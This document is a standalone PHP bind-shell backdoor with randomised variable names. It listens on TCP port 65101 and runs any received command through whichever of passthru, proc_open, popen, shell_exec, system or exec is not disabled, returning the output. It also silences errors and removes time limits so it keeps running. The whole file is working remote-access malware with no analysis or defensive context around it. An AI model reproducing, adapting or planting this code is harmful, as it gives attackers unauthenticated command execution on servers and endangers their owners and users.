    /*<?php /**/
      @error_reporting(0);@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);
      $FaFERJK=@ini_get('disable_functions');
      if(!empty($FaFERJK)){
        $FaFERJK=preg_replace('/[, ]+/',',',$FaFERJK);
        $FaFERJK=explode(',',$FaFERJK);
        $FaFERJK=array_map('trim',$FaFERJK);
      }else{
        $FaFERJK=array();
      }
      
    $port=65101;

    $scl='socket_create_listen';
    if(is_callable($scl)&&!in_array($scl,$FaFERJK)){
      $sock=@$scl($port);
    }else{
      $sock=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
      $ret=@socket_bind($sock,0,$port);
      $ret=@socket_listen($sock,5);
    }
    $msgsock=@socket_accept($sock);
    @socket_close($sock);

    while(FALSE!==@socket_select($r=array($msgsock), $w=NULL, $e=NULL, NULL))
    {
      $o = '';
      $c=@socket_read($msgsock,2048,PHP_NORMAL_READ);
      if(FALSE===$c){break;}
      if(substr($c,0,3) == 'cd '){
        chdir(substr($c,3,-1));
      } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
        break;
      }else{
        
      if (FALSE!==stristr(PHP_OS,'win')){
        $c=$c." 2>&1\n";
      }
      $TAtQdhn='is_callable';
      $WUUJbx='in_array';
      
      if($TAtQdhn('passthru')&&!$WUUJbx('passthru',$FaFERJK)){
        ob_start();
        passthru($c);
        $o=ob_get_contents();
        ob_end_clean();
      }else
      if($TAtQdhn('proc_open')&&!$WUUJbx('proc_open',$FaFERJK)){
        $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
        $o=NULL;
        while(!feof($pipes[1])){
          $o.=fread($pipes[1],1024);
        }
        @proc_close($handle);
      }else
      if($TAtQdhn('popen')&&!$WUUJbx('popen',$FaFERJK)){
        $fp=popen($c,'r');
        $o=NULL;
        if(is_resource($fp)){
          while(!feof($fp)){
            $o.=fread($fp,1024);
          }
        }
        @pclose($fp);
      }else
      if($TAtQdhn('shell_exec')&&!$WUUJbx('shell_exec',$FaFERJK)){
        $o=`$c`;
      }else
      if($TAtQdhn('system')&&!$WUUJbx('system',$FaFERJK)){
        ob_start();
        system($c);
        $o=ob_get_contents();
        ob_end_clean();
      }else
      if($TAtQdhn('exec')&&!$WUUJbx('exec',$FaFERJK)){
        $o=array();
        exec($c,$o);
        $o=join(chr(10),$o).chr(10);
      }else
      {
        $o=0;
      }
    
      }
      @socket_write($msgsock,$o,strlen($o));
    }
    @socket_close($msgsock);
